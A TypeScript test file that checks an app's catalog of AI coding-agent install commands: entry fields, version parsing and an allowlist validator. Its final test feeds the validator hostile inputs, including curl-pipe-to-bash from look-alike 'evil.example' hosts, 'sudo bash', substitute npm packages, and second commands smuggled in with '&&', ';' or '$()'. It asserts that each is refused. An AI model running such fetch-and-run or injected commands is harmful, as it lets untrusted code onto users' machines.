import { describe, expect, it } from "bun:test";

import { AGENT_CATALOG, APPROVED_COMMANDS, CATALOG_PLATFORMS, catalogPlatform, COMMAND_TESTS, commandProblems, meetsMinVersion, parseVersion, type AgentCatalogEntry, type InstallMethod } from "./agent-catalog.ts";
import { SUPPORTED_AGENT_KINDS } from "./supported-agents.ts";
import type { UsageProviderId } from "./usage.ts";

const PROVIDERS: Record<UsageProviderId, true> = { claude: true, codex: true, cursor: true, copilot: true, grok: true, antigravity: true, opencode: true };
const DATE = /^\d{4}-\d{2}-\d{2}$/;
const methods = (entry: AgentCatalogEntry): [string, InstallMethod][] => CATALOG_PLATFORMS.flatMap((platform) => {
  const install = entry.install[platform];
  return install === null ? [] : [install.primary, ...install.alternatives].map((method): [string, InstallMethod] => [platform, method]);
});

describe("agent catalog", () => {
  it("has one entry for every agent Ovis supports, Command Code and Muse Code too", () => {
    const ids = AGENT_CATALOG.map((entry) => entry.id);
    expect(new Set(ids).size).toBe(ids.length);
    for (const kind of [...SUPPORTED_AGENT_KINDS, "cmd", "muse"]) expect(ids).toContain(kind);
  });

  it("gives every entry the fields the install flow reads, in their shape", () => {
    const problems: string[] = [];
    for (const entry of AGENT_CATALOG) {
      const at = (what: string) => problems.push(`${entry.id}: ${what}`);
      if (!entry.name || !entry.vendor) at("name and vendor");
      if (!["harness", "assistant"].includes(entry.kind)) at(`kind ${entry.kind}`);
      if (entry.description.length === 0 || entry.description.length > 90 || entry.description.includes("\n")) at("a one-line description of at most 90 characters");
      for (const platform of CATALOG_PLATFORMS) {
        const reason = entry.no_install[platform];
        if ((entry.install[platform] === null) !== (reason !== undefined && reason.length > 0)) at(`${platform}: a command, or a reason there is none, never both`);
      }
      for (const [platform, method] of methods(entry)) {
        const shells = platform === "windows" ? ["powershell", "cmd"] : ["posix"];
        if (!shells.includes(method.shell)) at(`${platform}: shell ${method.shell}`);
        if (method.command.trim() === "" || method.command.includes("\n")) at(`${platform}: a one-line command`);
        for (const test of method.tested) if (!DATE.test(test.on) || !test.where || !["ok", "failed"].includes(test.result)) at(`${platform}: a test record ${JSON.stringify(test)}`);
      }
      const installs = CATALOG_PLATFORMS.some((platform) => entry.install[platform] !== null);
      if (installs && entry.sources.length === 0) at("the vendor page each command was read from");
      for (const source of entry.sources) {
        if (!source.url.startsWith("https://")) at(`source ${source.url} over HTTPS`);
        if (!DATE.test(source.checked) || Number.isNaN(Date.parse(source.checked))) at(`source date ${source.checked}`);
      }
      if (entry.detect.binaries.length === 0 || [...entry.detect.binaries, ...entry.detect.needs ?? []].some((binary) => !/^[a-z0-9][a-z0-9._-]*$/.test(binary))) at("plain binary names");
      if (entry.detect.version_args.length === 0) at("a version flag");
      const limit = entry.detect.version_timeout_ms;
      if (limit !== undefined && !(Number.isInteger(limit) && limit > 5_000 && limit <= 30_000)) at(`a version-flag limit above the 5 s default and at most 30 s, not ${limit}`);
      if (entry.sign_in !== null && entry.sign_in.provider !== null && !PROVIDERS[entry.sign_in.provider]) at(`sign-in provider ${entry.sign_in.provider}`);
      if (entry.min_version !== null && (!/^\d+\.\d+(?:\.\d+)?$/.test(entry.min_version.version) || entry.min_version.reason === "")) at("a dotted minimum version and the feature that needs it");
    }
    expect(problems).toEqual([]);
  });

  it("marks every command that may ask for sudo or administrator rights as admin, so the install flow can say so first", () => {
    const unmarked = AGENT_CATALOG.flatMap((entry) => methods(entry)
      .filter(([, method]) => !method.admin && method.known_issues.some((issue) => /\b(?:asks? for sudo|may ask for sudo|administrator rights)\b/i.test(issue)))
      .map(([platform, method]) => `${entry.id} ${platform}: ${method.command}`));
    expect(unmarked).toEqual([]);
  });

  it("keeps a clean-PC run only for a command the catalog still lists on that platform", () => {
    const listed = new Set(AGENT_CATALOG.flatMap((entry) => methods(entry).map(([platform, method]) => `${platform}|${method.command}`)));
    expect(Object.keys(COMMAND_TESTS).filter((key) => !listed.has(key))).toEqual([]);
  });

  it("reads versions the way the agents print them", () => {
    expect(parseVersion("2.1.311 (Claude Code)\n")).toBe("2.1.311");
    expect(parseVersion("codex-cli 0.163.0\n")).toBe("0.163.0");
    expect(parseVersion("omp/18.8.7\n")).toBe("18.8.7");
    expect(parseVersion("grok 1.0.67 (2fe064390d07) [stable]\n")).toBe("1.0.67");
    expect(parseVersion("Muse Code 1.4.7 (1.4.7-R6101.1)\n")).toBe("1.4.7");
    expect(parseVersion("1.4.6\n")).toBe("1.4.6");
    expect(parseVersion("usage: tool [options]\n")).toBeNull();
    expect(meetsMinVersion("0.163.0", "0.157.0")).toBe(true);
    expect(meetsMinVersion("0.157", "0.157.0")).toBe(true);
    expect(meetsMinVersion("0.99.9", "0.157.0")).toBe(false);
    expect(meetsMinVersion("2.1.311", "2.1.284")).toBe(true);
    expect(catalogPlatform("darwin")).toBe("macos");
    expect(catalogPlatform("win32")).toBe("windows");
    expect(catalogPlatform("freebsd")).toBeNull();
  });
});

describe("agent catalog commands", () => {
  it("fetch only the vendor's own HTTPS addresses and install only the vendor's own packages", () => {
    expect(AGENT_CATALOG.flatMap((entry) => commandProblems(entry))).toEqual([]);
  });

  it("approve exactly the commands the catalog holds, per platform: none missing, none left over", () => {
    const held = new Set<string>();
    for (const entry of AGENT_CATALOG) {
      for (const platform of CATALOG_PLATFORMS) {
        const install = entry.install[platform];
        if (install !== null) for (const method of [install.primary, ...install.alternatives]) held.add(`${platform}|${method.command}`);
      }
    }
    expect({ unapproved: [...held].filter((command) => !APPROVED_COMMANDS.has(command)), stale: [...APPROVED_COMMANDS].filter((command) => !held.has(command)) }).toEqual({ unapproved: [], stale: [] });
  });

  it("accept only the catalog's own commands, byte for byte: no suffix, version, argument or whitespace added", () => {
    const refused: string[] = [];
    for (const entry of AGENT_CATALOG) {
      for (const platform of CATALOG_PLATFORMS) {
        const install = entry.install[platform];
        if (install === null) continue;
        const listed = [install.primary, ...install.alternatives];
        listed.forEach((method, index) => {
          const variants = [`${method.command}EXTRA`, `${method.command} --extra`, `${method.command} `, ` ${method.command}`, method.command.replace(" ", "  "), method.command.replace(" ", "\t")];
          if (/^npm (?:install|i) -g /.test(method.command)) variants.push(`${method.command.replace(/@latest$/, "")}@0.0.1`);
          for (const variant of variants) {
            const mutated: AgentCatalogEntry = { ...entry, install: { ...entry.install, [platform]: { primary: index === 0 ? { ...method, command: variant } : install.primary, alternatives: install.alternatives.map((other, at) => at + 1 === index ? { ...other, command: variant } : other) } } };
            if (commandProblems(mutated).length === 0) refused.push(`${entry.id} ${platform}: ${JSON.stringify(variant)} was accepted`);
          }
        });
      }
    }
    expect(refused).toEqual([]);
  });

  it("list no address or package that no command uses", () => {
    const stale: string[] = [];
    for (const entry of AGENT_CATALOG) {
      const commands = methods(entry).map(([, method]) => method.command);
      for (const prefix of entry.url_prefixes) if (!commands.some((command) => command.includes(prefix))) stale.push(`${entry.id}: ${prefix}`);
      for (const pkg of entry.packages) if (!commands.some((command) => command.includes(pkg.slice(pkg.indexOf(":") + 1)))) stale.push(`${entry.id}: ${pkg}`);
    }
    expect(stale).toEqual([]);
  });

  it("refuse another host, plain HTTP, sudo, another package and a command that names nothing", () => {
    const claude = AGENT_CATALOG.find((entry) => entry.id === "claude")!;
    const codex = AGENT_CATALOG.find((entry) => entry.id === "codex")!;
    const withLinux = (entry: AgentCatalogEntry, command: string): AgentCatalogEntry => ({
      ...entry,
      install: { ...entry.install, linux: { primary: { ...entry.install.linux!.primary, command }, alternatives: [] } },
    });
    const problems = (entry: AgentCatalogEntry, command: string) => commandProblems(withLinux(entry, command)).filter((problem) => problem.startsWith(`${entry.id} linux`));
    expect(problems(claude, "curl -fsSL https://claude.ai/install.sh | bash")).toEqual([]);
    expect(problems(claude, "curl -fsSL https://claude.ai.evil.example/install.sh | bash")).not.toEqual([]);
    expect(problems(claude, "curl -fsSL https://evil.example/claude.ai/install.sh | bash")).not.toEqual([]);
    expect(problems(claude, "curl -fsSL http://claude.ai/install.sh | bash")).not.toEqual([]);
    expect(problems(claude, "curl -fsSL https://claude.ai/install.sh | sudo bash")).not.toEqual([]);
    expect(problems(codex, "npm install -g @openai/codex")).toEqual([]);
    expect(problems(codex, "npm install -g @openai/codex-helper")).not.toEqual([]);
    expect(problems(codex, "npm i -g openai-codex@latest")).not.toEqual([]);
    expect(problems(codex, "echo installed")).not.toEqual([]);
    // a command that installs several packages has each of them checked, not only the first
    expect(problems(codex, "npm install -g @openai/codex left-pad").filter((problem) => problem.includes("installs npm:left-pad"))).toHaveLength(1);
    expect(problems(codex, "npm i -g left-pad @openai/codex").filter((problem) => problem.includes("installs npm:left-pad"))).toHaveLength(1);
    expect(problems(codex, "npm install -g @openai/codex @openai/codex").filter((problem) => problem.includes("installs npm:"))).toEqual([]);
    // a flag between or after the packages neither hides a package nor passes unremarked
    const flagged = problems(codex, "npm install -g @openai/codex --ignore-scripts left-pad");
    expect(flagged.filter((problem) => problem.includes("installs npm:left-pad"))).toHaveLength(1);
    expect(flagged.filter((problem) => problem.includes("passes npm --ignore-scripts"))).toHaveLength(1);
    // anything after an approved command, in any shell's syntax, is not the vendor's command
    for (const extra of [" && touch /tmp/unapproved", "; touch /tmp/unapproved", " | tee /tmp/x", " $(touch /tmp/x)", "\ntouch /tmp/x"]) {
      expect(problems(claude, `curl -fsSL https://claude.ai/install.sh | bash${extra}`)).not.toEqual([]);
      expect(problems(codex, `npm install -g @openai/codex${extra}`)).not.toEqual([]);
    }
  });
});
